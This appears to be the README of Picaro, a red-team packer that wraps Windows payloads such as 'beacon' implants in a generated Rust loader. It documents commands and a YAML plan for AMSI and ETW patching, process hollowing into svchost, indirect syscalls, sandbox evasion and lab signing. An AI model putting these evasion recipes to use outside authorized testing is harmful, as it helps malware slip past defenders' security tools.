<p align="center">
  <img src="docs/assets/full-logo-512.webp" alt="Picaro: a joker card bearing the Picaro jester and a P corner index" height="300" />
</p>

**Declarative evasion for Windows payloads**

Picaro takes a PE file and a YAML plan and emits a packed PE with the selected
evasion techniques baked into a freshly generated Rust stub. No cleartext
payload ever touches disk: it is authenticated-encrypted at build time and only
ever exists decrypted in memory at run time.

## Authorized use only

For **authorized red team engagements, lab environments and security research**.
You are responsible for what you build with it.

## Quick start

With a Rust toolchain (Windows, or Linux/WSL cross-compiling to Windows):

```bash
cargo run -- pack examples/payloads/test_payload.exe
cargo run -- build examples/plans/process-hollowing.yaml
cargo run -- audit dist/process-hollowing/test_packed.exe
cargo run -- techniques list
```

Without a toolchain, the compose dev container builds the image once and
bind-mounts the repo, so source edits never rebuild it:

```bash
docker compose build dev                       # once
docker compose run --rm dev-run build examples/plans/process-hollowing.yaml
docker compose run --rm dev cargo test
```

Both paths cross-compile the Windows PE, so run the resulting artifact on a
Windows host. `python scripts/picaro.py` is the **production** image for a
machine with nothing installed; it builds `picaro:latest` on first use. See
[`docs/`](docs/) for every variant.

## Pack without a plan

`pack` detects the format and composes the plan for you:

```bash
cargo run -- pack examples/payloads/test_payload.exe
```

It picks `reflective_loading` for a PE or raw shellcode, `dotnet_hosting` for a
.NET assembly and `powershell_hosting` for a `.ps1`, defaults to indirect
syscalls with `hells_gate`, and writes a complete package to
`packed/<payload>/`: the rendered `main.rs`, the encrypted payload blobs, the
artifact, the manifest and the generated `plan.yaml`; `--sign lab` also leaves
the `.ca.cer` and the lab identity there.

For a DLL, `pack` reads the export table: if there is exactly one callable
export besides `DllMain`, it selects it and says so; if there are several, it
lists them and asks for `--export <name>`.

```text
packed/test_payload/
├── main.rs
├── payload_0.bin
├── test_payload.exe
├── test_payload.manifest.json
└── plan.yaml
```

Common knobs:

```bash
cargo run -- pack beacon.bin --patch-amsi --patch-etw --erase-header
cargo run -- pack implant.exe --hollow --target 'C:\Windows\System32\svchost.exe'
cargo run -- pack app.exe --syscalls indirect --resolver tartarus-gate --stack-spoofing
cargo run -- pack app.exe --sign lab --icon random
cargo run -- pack payload.ps1 --allow-experimental
```

A non-`Stable` technique selected explicitly with `--exec`/`-t` needs
`--allow-experimental`. Change the defaults in `picaro.config.yaml` (see
`examples/picaro.config.yaml`); `picaro pack --help` lists every flag and
[CLI pack design](docs/design/cli-pack.md) explains the ordering. When the build
outgrows the flags, `--print-plan` emits the YAML and you continue with
`picaro build`.

## Build a payload

`build` takes a YAML plan. The artifact name comes from `output.path`, but the
run emits a full package in a folder named after the plan, inside the artifact's
directory (or under `packed/` for a bare filename): `./dist/beacon.exe` in a plan
named `beacon` becomes `dist/beacon/beacon.exe`, with `main.rs`, the encrypted
payloads, the manifest and any CA beside it.

A build is one YAML document. `build.payloads` maps a name to your binary,
`build.stub` holds loader-wide settings (the syscall layer, string obfuscation),
`build.output` places the artifact and can embed resources and sign it, and the
top-level `runtime` list is the ordered chain the stub walks — preparation
techniques first, then the execution technique that runs the payload:

```yaml
schema: 6
name: demo

build:
  # Named payloads
  payloads:
    implant:
      source: ./beacon.exe          
  # Loader
  stub:
    syscalls: 
      mode: indirect
      resolver: tartarus_gate 
    strings: 
      strategy: xor
      key: random 
  output:
    path: ./dist/beacon_packed.exe
    resources:
      icon: ./examples/assets/sample.ico
      version_info: 
        randomize: true                  # Fake Company, ProductName, Version...etc
    sign: { mode: lab }                  # Create CA and sign the binary

# One ordered chain: preparations run first, then the payload.
runtime:
  - technique: bouncer                   # stay dormant off-target / in a sandbox
    params:
      require:
        - ram_mb: 2048
      anti_analysis:
        sandbox: true

  - technique: patch_amsi                # neutralize AMSI in the loader's process
  - technique: patch_etw                 # and ETW, before anything runs

  - technique: process_hollowing         # run the PE inside a signed host process
    params:
      payload: implant
      target: "C:\\Windows\\System32\\svchost.exe"
```

```bash
cargo run -- build plan.yaml
# or, in the dev container:
# docker compose run --rm dev-run build plan.yaml
```

## Examples

Ready-to-run plans live in [`examples/plans/`](examples/plans) (process
hollowing, reflective loading, indirect syscalls, .NET, DLL output, shellcode,
preparations, signing, x86, …), with payloads in
[`examples/payloads/`](examples/payloads). Start there and point `source` at
your own binary.

## Development

The fast loop needs no image rebuild. On the host (or in the dev container):

```bash
cargo run -- build examples/plans/process-hollowing.yaml
cargo test
cargo clippy --all-targets -- -D warnings
```

In the dev container, `target/` lives in the `picaro-target` volume and
`scripts/dev-entrypoint.sh` seeds the cross-compiled stub dependencies once:

```bash
docker compose run --rm dev bash                 # shell in /work
docker compose run --rm dev-run build plan.yaml  # one-shot cargo run
docker compose run --rm dev cargo test
```

`docker compose down -v` resets the cached build. The live suite (it compiles
and runs artifacts) stays opt-in and lab-only:

```bash
cargo test --features live-tests -- --ignored
```

## Documentation

Full docs live in [`docs/`](docs/) (`python scripts/docs.py` previews the site).
